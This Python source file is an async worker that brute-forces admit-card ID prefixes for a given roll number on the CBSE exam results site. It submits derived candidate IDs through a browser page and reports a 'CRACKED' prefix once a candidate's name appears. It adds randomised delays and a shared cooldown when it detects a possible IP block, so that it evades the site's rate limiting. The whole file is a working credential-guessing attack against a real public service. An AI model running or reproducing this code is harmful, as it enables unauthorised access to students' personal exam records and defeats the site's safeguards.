from __future__ import annotations

"""Async prefix-cracking worker."""
import time
import random
import logging
import asyncio
from typing import Any

logger = logging.getLogger(__name__)

from cbse.endpoints import RESULT_URL
from cbse.selectors import XPATH_ROLL
from cbse.admit_id import derive_admid
from cbse.form import ensure_on_form, fast_crack_submit


async def worker_crack_async(
    page: Any,
    prefix_queue: asyncio.Queue[str],
    roll: int,
    school_no: str,
    centre_mid: str,
    found_event: asyncio.Event,
    result_list: list[tuple[str, str, int]],
    thread_id: int,
    q: Any,
    stop_event: Any,
    throttle_until: list[float],
) -> None:
    """Pull prefixes from a shared queue with rate-limit throttling."""
    on_form = True  # Track form state to skip unnecessary ensure_on_form calls

    while True:
        if (stop_event and stop_event.is_set()) or found_event.is_set():
            return

        try:
            p = prefix_queue.get_nowait()
        except asyncio.QueueEmpty:
            return

        q.put(f"   -> [W{thread_id+1}] Trying: {p}")
        candidate_admid = derive_admid(p, roll, school_no, centre_mid)

        try:
            now = time.time()
            if throttle_until[0] > now:
                wait_secs = throttle_until[0] - now
                q.put(f"   [!] [W{thread_id+1}] Rate-limited. Waiting {wait_secs:.0f}s...")
                await asyncio.sleep(wait_secs)

            await asyncio.sleep(random.uniform(0.05, 0.2))

            if not on_form:
                await ensure_on_form(page)
                on_form = True

            if found_event.is_set():
                try: prefix_queue.put_nowait(p)
                except Exception: pass
                return

            page._dialog_fired = False
            await fast_crack_submit(page, roll, school_no, candidate_admid)

            if found_event.is_set():
                return

            if not page._dialog_fired:
                await asyncio.sleep(0.1)

            if page._dialog_fired:
                # Dialog = invalid prefix. CBSE page does alert() then history.back().
                try:
                    await page.locator(XPATH_ROLL).wait_for(state="visible", timeout=2000)
                    on_form = True
                except Exception:
                    on_form = False
                continue

            body_text = await page.inner_text('body', timeout=1500)
            if "Candidate Name" in body_text:
                if not found_event.is_set():
                    found_event.set()
                    result_list.append((p, candidate_admid, thread_id))
                    q.put(f"   [+] [W{thread_id+1}] CRACKED: Prefix {p} works!")
                return

            # CBSE sometimes returns a "Result Not Found" page instead of a dialog.
            # This is a normal invalid attempt, NOT an IP block.
            if "Result Not Found" in body_text or "Please enter correct" in body_text or "Invalid" in body_text:
                try:
                    await page.go_back(wait_until='domcontentloaded', timeout=3000)
                    await page.locator(XPATH_ROLL).wait_for(state="visible", timeout=2000)
                    on_form = True
                except Exception:
                    on_form = False
                continue

            try:
                form_there = await page.locator(XPATH_ROLL).count() > 0
            except Exception:
                form_there = False

            if form_there:
                on_form = True
                continue

            # Truly unknown page — trigger cooldown for all workers
            cooldown = 30
            throttle_until[0] = time.time() + cooldown
            q.put(f"   [!] [W{thread_id+1}] Possible IP block detected! All workers pausing {cooldown}s...")
            on_form = False
            await asyncio.sleep(cooldown)

        except asyncio.CancelledError:
            try: prefix_queue.put_nowait(p)
            except Exception: pass
            return
        except Exception:
            if found_event.is_set():
                return
            on_form = False
            recovered = False
            for retry in range(3):
                try:
                    await page.goto(RESULT_URL, wait_until='domcontentloaded', timeout=8000)
                    await page.locator(XPATH_ROLL).wait_for(state="visible", timeout=5000)
                    recovered = True
                    on_form = True
                    break
                except Exception:
                    await asyncio.sleep(random.uniform(1.0, 3.0))

            if not recovered:
                try: prefix_queue.put_nowait(p)
                except Exception: pass
                q.put(f"   [!] [W{thread_id+1}] Worker could not recover after 3 retries. Returning work to queue.")
                return
            try: prefix_queue.put_nowait(p)
            except Exception: pass
